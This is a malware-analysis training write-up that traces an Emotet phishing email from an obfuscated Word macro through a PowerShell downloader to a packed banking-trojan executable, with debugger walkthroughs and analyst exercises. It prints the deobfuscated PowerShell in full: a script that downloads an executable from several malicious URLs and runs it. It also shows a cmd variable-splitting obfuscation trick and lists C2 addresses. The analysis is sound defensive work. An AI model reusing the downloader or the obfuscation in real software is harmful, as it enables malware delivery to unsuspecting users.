# Analysis of a Phishing Email 

A phishing lure is a high-quality source of intelligence which we can mine for techniques currently being used by all types of malware in the wild.  In this document, we look at the email from INV-2018-02-426696 / INC0992607 and review different analysis techniques that can be used to reveal what the malware is hiding and how it operates.


- [Automated Analysis](#automated-analysis)
- [Static Analysis](#static-analysis)
- [Dynamic Analysis](#dynamic-analysis)
- [Code Analysis](#code-analysis)
- [Summary](#summary)



## Automated Analysis

The sandbox analysis at [Reverse.It](https://www.reverse.it/sample/783d08e2dbdaffcfa923583d842b4fbf82be3c85b2c50d284002815a973646ae?environmentId=100) provides us a general flow of the events involved:

- The email contains a link to a Word document

- A Word macro spawns `cmd.exe` which spawns `powershell.exe` which spawns `272861.exe`

- Two hosts are contacted:

  ![](images/Analysis%20of%20a%20Phishing%20Email/image048.png)<br><br>


Also running the file with [ANY.RUN](https://app.any.run/tasks/6ba78376-295f-4f06-bd53-98e8cea902be) shows the process tree created:

![](images/Analysis%20of%20a%20Phishing%20Email/image047.png)<br><br>

Along with some alerts:

![](images/Analysis%20of%20a%20Phishing%20Email/image044.png)<br><br>


## Static Analysis

First let's inspect the document using `olevba.py`.

`olevba.py` reports the macro has multiple suspicious characteristics:

![](images/Analysis%20of%20a%20Phishing%20Email/image001.png)<br><br>


Examining the macro by opening it in MS Office, we see several macros. In each one, many variables are being declared but very few functions are being called.

Buried in between junk code, we see the macro attempting to run something:

![](images/Analysis%20of%20a%20Phishing%20Email/image002.png)<br><br>


When we find and inspect the contents of the `GEDVjLFw` variable, we find more junk code hiding the strings "Shell" and "vbHide":

![](images/Analysis%20of%20a%20Phishing%20Email/image003.png)<br><br>

So far we've got: "`Application.Run Shell, vbHide, ziPFFrqNU`"

When we find and inspect the contents of the `ziPFFrqNU` function, there are hundreds of lines of code used to obfuscate the command:

![](images/Analysis%20of%20a%20Phishing%20Email/image004.png)<br><br>


We know it gets deobfuscated just before it executes, so let's change the macro's function from *running* the command to *printing* it:

![](images/Analysis%20of%20a%20Phishing%20Email/image005.png)<br><br>


After making the change and saving the document, we can run the macro and see the command that would have been executed:

![](images/Analysis%20of%20a%20Phishing%20Email/image006.png)<br><br>


Let's look at the command that the macro runs.  First `cmd.exe` is called and several variables are defined.  Extracting specific variables that are set reveals how `cmd.exe` will interpret these commands:

```
set %var1% = p
set %var2% = ow
set %var3% = er
set %var4% = s
set %var5% = he
set %var6% = ll
set %var8%=!%var2%!
set %var7%=!%var1%!
```

<br>

The `/V` switch is used to ensure that environment variables are only expanded just before they are executed. The last command is a group of variables followed by a long argument containing .NET functions:

```
!%var7%!!%var8%!!%var3%!!%var4%!!%var5%!!%var6%! "([rUnTiME.INTeroPseRvICeS.mArshAl]::pTrToStringunI(..."
```

<br>

We can demonstrate how this works by going to Start Menu and typing `cmd /V` to start `cmd.exe` with delayed expansion enabled. When we set the same variables and give it a test argument, it succeeds in executing a PowerShell command:

![](images/Analysis%20of%20a%20Phishing%20Email/image007.png)<br><br>


Since `MsgBox` has a 1024 character limit, the PowerShell command is incomplete.  To see the entire command, add some additional code to the macro that writes the variable contents to the clipboard:

![](images/Analysis%20of%20a%20Phishing%20Email/image010.png)<br><br>


With Office 2013, press `Alt-F11`, `Tools` --> `References` --> `Browse` and choose the `FM20.DLL` to use MSForms.DataObject in the macro. Now close and save the document, reopen, and paste into a blank text document:

![](images/Analysis%20of%20a%20Phishing%20Email/image011.png)<br><br>

You could Another way to do this is using `Debug.print (ziPFFrqNU)` and then view the contents of the variable with `Ctrl + G`. 
<br>

Looking at the complete command, it passes a large encrypted blob to `Convert-ToSecureString` which decrypts it with the included key:

![](images/Analysis%20of%20a%20Phishing%20Email/image012.png)<br><br>

After decryption, the output is passed to the expression: `( ([string]$VERbosepREfeREnCe)[1,3]+'X' –join'')`

To see what this expression means, just let PowerShell interpret it:

![](images/Analysis%20of%20a%20Phishing%20Email/image008.png)<br><br>

Now instead of passing it to `Invoke-Expression` for execution, remove the `IEX` and print the decrypted contents to the screen:

![](images/Analysis%20of%20a%20Phishing%20Email/image009.png)<br><br>

Now we can go through the full, deobfuscated PowerShell command and identify what actions are being performed:

```powershell

# Create a random file name
$nsadasd = new-object random
$NSB = $nsadasd.next(1000, 282133)

# Create a web client
$YYU = new-object System.Net.WebClient

# Create an array of URLs
$ADCX = 'http://www.vendendovendendo[.]com/I41rpk/?http://re-oz[.]ru/Rhsri/?http://www.utilitybillingsoftwares[.]com/Yr13ok/?http://t-p-e[.]net/M8uZOL/?http://cathroughmylens[.]com/XztRX8o/'.split('?')

# Create a full file path for EXE
$SDC = $env:public + '\' + $NSB + ('.ex'+'e')

# Try to download EXE from each URL in array and execute
foreach ($asfc in $ADCX) {
  try {
    $YYU.DownloadFile($asfc.ToString(), $SDC)
    Invoke-Item $SDC
    Break
  }
  catch {}
}
```

<br>

When the PowerShell command runs, the URLs are contacted one by one in an attempt to download the executable. If any of the attempts are successful, the executable begins running out of the `C:\Users\Public` directory.

![](images/Analysis%20of%20a%20Phishing%20Email/image013.png)<br><br>

In this case, none of the URLs delivered the payload:

![](images/Analysis%20of%20a%20Phishing%20Email/image014.png)<br><br>


I was able to continue analysis by getting a copy of the executable that would have been downloaded from `www.vendendovendendo[d]com/I41rpk` at this [sample page](https://www.reverse.it/sample/783d08e2dbdaffcfa923583d842b4fbf82be3c85b2c50d284002815a973646ae?environmentId=100).

<br>

Examine `272861.exe` using [PEStudio](https://www.winitor.com/) and [CFF Explorer](http://www.ntcore.com/exsuite.php).  Notice the Import Address Table only lists 5 DLLs: 

![](images/Analysis%20of%20a%20Phishing%20Email/image017.png)<br><br>

This is a good indication that the file is packed in an attempt to hide some of its functionality.  Let's run it on the OOB and see what else we can discover.

<br>

## Dynamic Analysis

When `272861.exe` runs on a host, it spawns a copy of itself and creates a new service which runs a process with a generic name such as `provstorage.exe`, `secmsi.exe` or `appwin.exe`.

This new process tries to connect to multiple IP addresses:

```
91.217.66[.]130
93.42.184[.]106
119.59.124[.]163
52.4.64[.]240
217.13.106[.]246
185.20.226[.]170
179.100.27[.]18
217.35.83[.]153
46.22.132[.]72
87.106.201[.]89
80.86.91[.]232
69.45.19[.]251
213.108.33[.]44
106.187.91[.]235
103.233.58[.]6
```


When one of the IPs responds, the process begins sending a POST request every 15 minutes:

![](images/Analysis%20of%20a%20Phishing%20Email/image050.png)<br><br>


Both the contents of the POST request and response appear to be encrypted: 

![](images/Analysis%20of%20a%20Phishing%20Email/image051.png)<br><br>


Many of the IP addresses it attempts to contact can be found in a list of C2 servers on [feodotracker.abuse.ch](https://feodotracker.abuse.ch/):

![](images/Analysis%20of%20a%20Phishing%20Email/image052.png)<br><br>


Look at the process's memory with [Process Hacker](https://github.com/processhacker/processhacker).  The process has two regions of memory marked as executable and private:

![](images/Analysis%20of%20a%20Phishing%20Email/image053.png)<br><br>


The first memory region is an executable:

![](images/Analysis%20of%20a%20Phishing%20Email/image054.png)<br><br>


The second memory region could be encrypted data or shellcode:

![](images/Analysis%20of%20a%20Phishing%20Email/image055.png)<br><br>


After a few POST request/responses, a new process named `svchost.exe` is started.  This process also has two injected areas of memory and contains strings associated with bot control, injecting web content, and stealing sensitive information.

So far what we've found aligns with what several file reputation sites have reported---that this is an emotet variant, a banking trojan.  Now that we know the general steps the malware takes, let's see how it is interacting with the system using code analysis.


## Code Analysis

Before debugging, let's use [API Monitor](http://www.rohitab.com/apimonitor) to get familiar with some of the API calls `272861.exe` makes.  Then we'll use function calls to determine how the malware is performing the following actions:

- [Getting OS Information](#getting-os-information)
- [Allocating Memory](#allocating-memory)
- [Executing Different Parts of the Code](#executing-different-parts-of-the-code)

<br>

To observe the processes created by `272861.exe` with [API Monitor](http://www.rohitab.com/apimonitor):

- Drag `272861.exe` into API Monitor x86

- Click **Enable Monitoring** if prompted

- Click **Monitor New Process**

- Browse to the executable and click **OK**

- If prompted to monitor `272861.exe` or the service (`appwin.exe`/`secmsi.exe`/`provstorage.exe`), click **Monitor**

- If prompted to monitor any unrelated processes, click **Skip**

- Open Process Hacker, find the service process (in this case `appwin.exe`) and **Right Click --> Terminate**

<br>

You should now have four processes under the Monitored Processes window and all of them should be terminated:

![](images/Analysis%20of%20a%20Phishing%20Email/image016.png)<br><br>

Expand each process to see the modules and threads. If we select the **Modules** tree for the first `272861.exe` process we see many modules that were dynamically loaded (on the fly). Highlight the first thread and look through the APIs that were called on the right pane. 

First we see a list of files and directories being enumerated, then we see some anti-sandbox checks:

![](images/Analysis%20of%20a%20Phishing%20Email/image019.png)<br><br>

Any functions that you aren't familiar with can be searched using [Microsoft's Windows API Index](https://msdn.microsoft.com/en-us/library/windows/desktop/ff818516.aspx).

The following functions are being used together to construct common sandbox usernames (John Doe) and compare them with usernames found on the system (kbota):

|Function|Description|
|-|-|
|`lstrcmp`|compares two strings and is case sensitive|
|`lstrcat`|appends one string to another|
|`lstrcpy`|copies a string to a buffer|

<br>

Looking at which APIs were used by the file in [API Monitor](http://www.rohitab.com/apimonitor) shows us that the `272861.exe` executable performs the following:

- Enumerates files and programs

- Performs sandbox checks

- Spawns a process of itself

- Copies itself as `appwin.exe` into the `C:\Windows\SysWOW64` directory

- Creates a new service using `C:\Windows\SysWOW64\appwin.exe` and starts it

<br>

Let's take a closer look with the [x32dbg](https://x64dbg.com/#start) debugger.


### Getting OS Information

One approach to use when debugging a program is to choose suspicious or interesting APIs and watch to see what actions the program performs with them.

Start out with a simple function that requires no arguments such as [GetVersion](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724439.aspx):


- Drag the sample into the [x32dbg](https://x64dbg.com/#start) shortcut on the Desktop

- Go to the **Symbols** tab

- Select `kernel32.dll`, click in the right pane and type `GetVersion`

- Right click on `GetVersion` and select `Toggle Breakpoint`


This will stop execution of the program whenever the `GetVersion` function is called.  Now go to the **Breakpoints** tab and confirm you have two breakpoints set:  the one you just made and the executable's entry point.

To make things easier, also set a breakpoint on the `CreateProcessInternalW` function in `kernel32.dll`.  When we hit this breakpoint, we've gone too far and the malware's next action is to create a second process which installs the malicious service.  With this breakpoint set, it keeps us from having to kill the additional processes and service and set everything up again if we miss our intended breakpoint which is `GetVersion`.

After this second breakpoint is set, go back to the **CPU** pane and start the program by pressing `F9`. The first breakpoint will stop the program at its entry point.  This is where the sample begins executing its code.  

Press `F9` again and the program stops just before the jump to the `GetVersion` function in `kernel32.dll`.


<br>

Look in the title bar of the debugger and find the module name.  Notice we are now in the `kernel32.dll` module and are looking at its code instead of `272861.exe`'s code.  To see what part of the sample's code called this `kernel32.dll` function and the context in which it was called, we need to do two things:

- Execute until we return to user code (`Alt-F9`)

- Set a breakpoint on the instruction that called the `GetVersion` function

<br>

So execute the function call and "run until user code" by pressing `Alt-F9` twice. We end up back in `272861.exe`'s code, right after the call to the `GetVersion` function completed. You should see your sample as the module name in the debugger's title window. 

Scroll up and look at the two lines just before the one we're on: 

![](images/Analysis%20of%20a%20Phishing%20Email/image024.png)<br><br>

The first of these two lines moves a pointer to the `GetVersion` function into the EAX register. The second calls the function that EAX contains.

It is this second line, the `call` instruction, that we will be most interested in as it will allow us to examine the conditions present when the function is called and any arguments that are passed.

Since this function requires no arguments, and it has completed, we will only examine the results that were returned. The `EAX` register typically contains the results of a function call like this:

![](images/Analysis%20of%20a%20Phishing%20Email/image020.png)<br><br>


The EAX register contains the hex value `1DB10106`.  The API's [documentation](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724439(v=vs.85).aspx) states the OS major and minor versions are in the low-order word `06 01` (Version 6.1) and information about the OS platform is in the high-order word `1DB1` (Build 7601).

A few lines later, the value in EAX is written to process memory to the address at \[esp+1C\] (`0x0018FEA4`).

<br>

### Allocating Memory

Now let's try a function that uses arguments.  [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890.aspx) is a function used to reserve memory within the address space of a process and is commonly used to perform process injection.

- Restart the debugger

- Set a breakpoint on the [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890.aspx) function in the `kernelbase.dll`

- Go to the **Breakpoints** tab and confirm it's set

- Remove the breakpoint on `GetVersion`

<br>

Since this function requires arguments, we need to find the function's code on [msdn.microsoft.com](https://msdn.microsoft.com/) and identify the order and meaning of each argument.  The arguments passed to this function are the process handle, the starting address, the size of memory, its allocation type, and its protection type:

```
LPVOID WINAPI VirtualAllocEx(
  _In_     HANDLE hProcess,
  _In_opt_ LPVOID lpAddress,
  _In_     SIZE_T dwSize,
  _In_     DWORD  flAllocationType,
  _In_     DWORD  flProtect
);
```

<br>

At the **CPU** window, press `F9` twice and you should be at the first instance of [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890.aspx).

When the debugger stops on the breakpoint, notice we are still in the sample's code.

Scroll up a few lines and observe the arguments being passed to the stack before the function is called:

![](images/Analysis%20of%20a%20Phishing%20Email/image023.png)<br><br>



What we want to do is find every time that [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890.aspx) is being called, and set a breakpoint on the line of sample code that calls it.

So you should find 4 different occurrences, and for each one do the following:

- When the breakpoint hits, Run to User Code (`Alt-F9`) until you return to `272861.exe`'s code

- Set a breakpoint on the line before the one you returned to (`call eax` or `call VirtualAllocEx` for example)

<br>

Once you've set breakpoints for each of the 4 times the function is called, delete the breakpoints for [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890.aspx).

Your breakpoints should now look something like this:

![](images/Analysis%20of%20a%20Phishing%20Email/image022.png)<br><br>

Now reload [x32dbg](https://x64dbg.com/#start) and press `F9` twice.  You should be at the first line of code that calls [VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx) (which will turn around and call [VirtualAllocEx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890.aspx)).

Scroll up a few lines and observe the arguments being passed to the stack before the function is called. This time we're dealing with the [VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx) function which can have a possible 4 arguments:


```
LPVOID WINAPI VirtualAlloc(
  _In_opt_ LPVOID lpAddress,
  _In_     SIZE_T dwSize,
  _In_     DWORD  flAllocationType,
  _In_     DWORD  flProtect
);
```

<br>

Now find the **Stack** pane and see how they are organized on the stack:

|Address|Value|Argument|Description|
|-|-|-|-|
|\[esp\]|00000000|lpAddress|Desired Starting Address|
|\[esp+4\]|00012000|dwSize|Memory Region Size|
|\[esp+8\]|00001000|flAllocationType|Memory Allocation Type|
|\[esp+C\]|00000004|flProtect|Memory Protection| 

<br>

The arguments are placed on the stack in this order so that when the function is called, the first argument is on the top of the stack, the second is next, and so on.

Looking at the function together with its arguments, we can now see that the sample code is asking for:

- a memory region starting at any address (**NULL**)

- a memory region with a size of `0x1200` (**73,728 bytes**)

- a memory region with allocation type `0x1000` (**MEM_COMMIT**) 

- a memory region with protection type `0x4` (**PAGE_READWRITE**)


Now press `F8` to step *over* the function call which allows the function to execute and return the results.  In this case the [VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx) function returns the address of the new memory region that was allocated via the EAX register.  

Observe the address the EAX register contains and find it in the **Memory Map** tab.  You can see that it has a size of `0x12000` and is type (`-RW--`) just as the code requested.

Go back to the **CPU Pane** and hit `F9` to jump to the second breakpoint.

This one is using the [memcpy](https://msdn.microsoft.com/en-us/library/dswaw1wk.aspx) function which requires 3 arguments:

```
void *memcpy(  
   void *dest,  
   const void *src,  
   size_t count   
);
```

<br>

Looking at the stack, we can see the 3 arguments that are passed to the function:

|Address|Value|Argument|Description|
|-|-|-|-|
|\[esp\]|0018FBFC|dest|The destination buffer|
|\[esp+4\]|00407758 272861.00407758|src|The buffer to copy from|
|\[esp+8\]|000000CC|count|The number of characters to copy|

<br>

Right click on the top of the stack and select **Follow \[18FBA8\] in Dump**.

In the **Dump Pane**, highlight from the starting address (`0x0018FBFC`) until you've highlighted "0xCC" number of bytes:

![](images/Analysis%20of%20a%20Phishing%20Email/image031.png)<br><br>

The bottom line of the debugger will tell you how many bytes you have highlighted.

Now, watch the highlighted area as you execute the [memcpy](https://msdn.microsoft.com/en-us/library/dswaw1wk.aspx) function by pressing `Alt-F9`.

The memory space that was highlighted was allocated and written to all at once by calling the [memcpy](https://msdn.microsoft.com/en-us/library/dswaw1wk.aspx) function:

![](images/Analysis%20of%20a%20Phishing%20Email/image032.png)<br><br>

Notice the EAX register again contains the starting address of the memory space that was written to.

Now press `F9` to go to the next breakpoint.

<br>

Next is another call to [VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx) with the following arguments:


|Address|Value|Argument|Description|
|-|-|-|-|
|\[esp\]|00000000|lpAddress|Desired Starting Address|
|\[esp+4\]|0000E000|dwSize|Memory Region Size|
|\[esp+8\]|00001000|flAllocationType|Memory Allocation Type|
|\[esp+C\]|00000040|flProtect|Memory Protection| 

<br>

This time `272861.exe`'s code is asking for:

- a memory region starting at any address (**NULL**)

- a memory region with a size of `0xE000` (**57,344 bytes**)

- a memory region with allocation type `0x1000` (**MEM_COMMIT**)

- a memory region with protection type `0x40` (**PAGE_EXECUTE_READWRITE**)

<br>

Execute the function with `Alt-F9` and check the EAX register for the starting address of the new memory region.

![](images/Analysis%20of%20a%20Phishing%20Email/image027.png)<br><br>

Find this new region in the **Memory Map** and verify it has (`ERW--`) permissions.

![](images/Analysis%20of%20a%20Phishing%20Email/image026.png)<br><br>

To see the data that was written to this memory region, Right click on this address --> **Follow in Dump**

![](images/Analysis%20of%20a%20Phishing%20Email/image029.png)<br><br>

When complete, you can now go back to the memory region in **Memory Map** and Right click --> **Dump to File**

On disk you can see it is exactly 57,344 bytes.

We can check to see if it's an EXE or DLL with [CFF Explorer](http://www.ntcore.com/exsuite.php):

![](images/Analysis%20of%20a%20Phishing%20Email/image033.png)<br><br>

Looking at the file with [PEStudio](https://www.winitor.com/), we see it does not list any imports, but it contains strings that are names of imports which will be resolved dynamically:

![](images/Analysis%20of%20a%20Phishing%20Email/image030.png)<br><br>

The structure of executables are different in memory than on disk, so since we dumped the memory-mapped version it requires some modifications if we want to run it on the machine or in a debugger.

For now though, we can get a pretty good idea of what the file does by looking at the functions that will be used:

|Function|Description|
|-|-|
|[LoadLibrary](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175.aspx)|Loads a DLL into process memory|
|[LdrGetProcedureAddress]()|Gets the address of a function|
|[UnmapViewOfFile](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366882.aspx)|Unmaps a mapped view of a file from the calling process's address space|
|[VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx)|Reserves, commits, or changes the state of a memory region|
|[GetProcAddress](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212.aspx)|Gets address of an exported function from a DLL|
|[VirtualProtect](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898.aspx)|Changes protection of a memory region in the calling process|
|[AddVectoredExceptionHandler](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679274.aspx)|Registers a vectored exception handler|
|[RemoveVectoredExceptionHandler](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680571.aspx)|Unregisters a vectored exception handler|

<br>


### Executing Different Parts of the Code

If you continue debugging `272861.exe`, you'll find that after it spawns a copy of itself it quickly exits.  But the duplicate process it spawns acts differently---it does not spawn a copy of itself and starts a service.  What makes the executable behave differently in the two different processes?

To answer this, we need to debug both the original and spawned processes.  

- Open the `272861.exe` with the debugger and place a breakpoint on the [CreateProcessW](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425.aspx) function

- Run the sample until the breakpoint hits, then Run to User code with `Alt-F9`

- If watching in Process Hacker, you'll see a duplicate process is created and after a few seconds it terminates with no service being created

We have to assume that the service was not created because the spawned process didn't see something it was expecting to see, or couldn't do something it expected to do.

<br>

Notice the orignal process being debugged has a few more instructions before it exits itself:

![](images/Analysis%20of%20a%20Phishing%20Email/image036.png)<br><br> 

If you observe the arguments for each of these function calls, you'll see the following:


- [WaitForSingleObject](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687032.aspx) gets called with a handle to event object `E30B15ABA` (`8C`) and time-out interval `FFFFFFFF` (wait infinitely)

- When that function completes, the handle to the duplicate process it created is closed with [CloseHandle](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211.aspx)

- Then a handle to the thread it had to the process is closed with [CloseHandle](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211.aspx)

- Then the event object (`E30B15ABA`) and the mutant object (`M30B15ABA`) are both closed with [CloseHandle](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211.aspx)

- Then [ExitProcess](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682658.aspx) is called and the process exits


Waitable objects such as `E30B15ABA` have a boolean value called the signalled state.  If the object is set to signalled, wait functions will complete and the next instructions are executed. If it not signalled, wait functions will wait until it is signalled.

From this sequence, we can see that the original process is waiting for the event object `E30B15ABA` to be signalled before it closes.  Let's see how this event object is created.


Set a breakpoint for [CreateEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396.aspx) which can take 4 arguments:

```
HANDLE WINAPI CreateEvent(
  _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
  _In_     BOOL                  bManualReset,
  _In_     BOOL                  bInitialState,
  _In_opt_ LPCTSTR               lpName
);
```

<br>

Now restart the debugger and press `F9` to get to each breakpoint on each [CreateEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396.aspx) function.  One of the events will have the name of the object (`E30B15ABA`) as an argument:

![](images/Analysis%20of%20a%20Phishing%20Email/image037.png)<br><br> 

This is the event object being created.  The name of the object is the fourth argument and so it occupies the fourth position on the stack.


We can also do this on the spawned process to watch it creating the object:

- Press `F9` until the breakpoint on [CreateProcessW](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425.aspx) hits

- Press `Alt-F9` to Run to User code so that the [CreateProcessW](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425.aspx) function completes

- After the spawned process is created and then exits, minimize the [x32dbg](https://x64dbg.com/#start) window with the original sample and open up a second instance of the sample by dragging `272861.exe` into the [x32dbg](https://x64dbg.com/#start) shortcut on the Desktop

You should now have two `272861.exe` processes being debugged---the original process and the spawned process.  In the spawned process:

- Go to the **Breakpoints** tab and make sure a breakpoint for [CreateEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396.aspx) is set

- Press `F9` until the program stops on the [CreateEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396.aspx) function that creates the `E30B15ABA` object

- Press `Alt-F9` to complete the function

Now check the EAX register for the result of the function. Notice this time the value `B7` is returned.  Looking at the [System Error Codes](https://msdn.microsoft.com/en-us/library/ms681382.aspx), we find that `B7` represents the code **ERROR_ALREADY_EXISTS** which means that the `E30B15ABA` object cannot be created because it already exists.

After this we see that:

- EAX is compared with the value `B7`

- The values are not equal so the jump to `0x2616CB` is not taken

- The contents of ESI (`8C`) is pushed to the stack

- The [SetEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686211.aspx) function is called to put event object (`E30B15ABA`) into the signalled state

![](images/Analysis%20of%20a%20Phishing%20Email/image038.png)<br><br>

- The handle to the Event Object (`8C`) is closed using [CloseHandle](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211.aspx)

- The handle to the Mutant Object (`90`) is closed using [CloseHandle](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211.aspx)

- The code jumps to `0x271D0E` and begins executing the EWR code that was unpacked into private memory


Now we understand how why the executable acted differently in the two processes.  The original process unpacks its malicious code, creates event object `E30B15ABA`, and then goes on to spawn a copy of itself.  The spawned process unpacks its malicious code, tries to create the same object, but when it can't it changes the object to signalled so the first process can exit, and then starts executing its unpacked code.  


After the spawned process signals the `E30B15ABA` object, the original process's [WaitForSingleObject](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687032.aspx) function completes, the handles to its objects and the spawned process are closed, and it exits.


The second process then continues on to create the auto-start service, which we can examine by inspecting the [OpenService](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684330.aspx), [CreateService](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682450.aspx), and [StartServiceW](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686321.aspx) functions.


## Summary 

Emotet is a downloader that has been used in multiple campaigns since 2014 to drop credential stealers and banking trojans.  It  is normally distributed using malicious attachments or links in spam emails.  Over time it's been upgraded with modular capabilities, virtual machine detection, and sandbox evasion techniques.

Being able to observe how malware interacts with the operating system is essential for understanding its full capabilities and what actions it performed on a victim system.  When cryptors are used to avoid detection and reverse engineering, the information analysts are after is encrypted, decrypted just before use, and deleted immediately after use.  Observing the malware use this information in a controlled environment allows us to access this information.

Additionally, different behaviors are sometimes exhibited  depending on what the malware finds on a victim system.  In some cases, if the malware detects that it has been started in a virtual machine, it functions as usual but may use a different, fake address list for C2 communications.


### Exercise

Use [x32dbg](https://x64dbg.com/#start) to answer the following questions:

- What part of the code makes the spawned process exit instead of create the service?

- What part of the code contacts the malware's C2 server?

- Can you find any code that attempts to identify the victim host as a virtual machine?

Artifacts on the OOB:

  /CSIRT/Sample-Files/email_paypal_receipt.msg
  /CSIRT/Sample-Files/272861.exe
